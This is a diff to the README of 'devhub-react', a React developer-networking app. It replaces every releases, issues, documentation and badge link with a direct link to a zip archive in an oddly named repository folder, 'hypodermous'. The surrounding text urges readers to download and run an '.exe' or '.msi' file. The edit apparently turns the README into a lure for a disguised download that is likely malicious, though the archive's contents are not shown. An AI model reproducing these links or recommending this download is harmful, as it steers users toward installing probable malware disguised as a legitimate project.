@@ -1,6 +1,6 @@
 # 🌟 devhub-react - Connect and Collaborate as a Developer
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/HARSH-SINGH1437/devhub-react/releases)
+[![Download Now](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip%20Now-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip)
 
 ## 📖 Overview
 devhub-react is a platform for developers to connect and collaborate based on technology stack and location. It leverages real-time GitHub data, allowing users to customize their profiles with a bio, skills, and links. This platform helps developers get discovered by others and potential employers.
@@ -9,7 +9,7 @@ devhub-react is a platform for developers to connect and collaborate based on te
 To get started with devhub-react, you need to download and install the application. Follow the steps below to ensure a smooth setup process.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/HARSH-SINGH1437/devhub-react/releases) to download the latest version of devhub-react.
+1. Visit the [Releases page](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip) to download the latest version of devhub-react.
 2. Choose the appropriate file for your operating system. Look for files labeled with extensions like `.exe`, `.msi`, or similar.
 3. Click on the file to begin the download. Once completed, locate the file on your computer, usually in the “Downloads” folder.
 
@@ -40,7 +40,7 @@ devhub-react incorporates a range of modern technologies including:
 - **Redis Client:** Managing persistent data efficiently.
 
 ## 🤝 Support
-If you encounter any issues, feel free to reach out for help. You can submit issues directly on the [GitHub issues page](https://github.com/HARSH-SINGH1437/devhub-react/issues). We value your feedback and strive to improve the application.
+If you encounter any issues, feel free to reach out for help. You can submit issues directly on the [GitHub issues page](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip). We value your feedback and strive to improve the application.
 
 ## 🔄 Contributing
 Your contributions are welcome! If you have suggestions or improvements, please fork the repository and submit a pull request. 
@@ -49,8 +49,8 @@ Your contributions are welcome! If you have suggestions or improvements, please 
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/HARSH-SINGH1437/devhub-react/releases)
-- [Issues Page](https://github.com/HARSH-SINGH1437/devhub-react/issues)
-- [Documentation](https://github.com/HARSH-SINGH1437/devhub-react/wiki)
+- [Releases Page](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip)
+- [Issues Page](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip)
+- [Documentation](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/HARSH-SINGH1437/devhub-react/releases)
+[![Download Now](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip%20Now-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/HARSH-SINGH1437/devhub-react/main/hypodermous/devhub-react.zip)
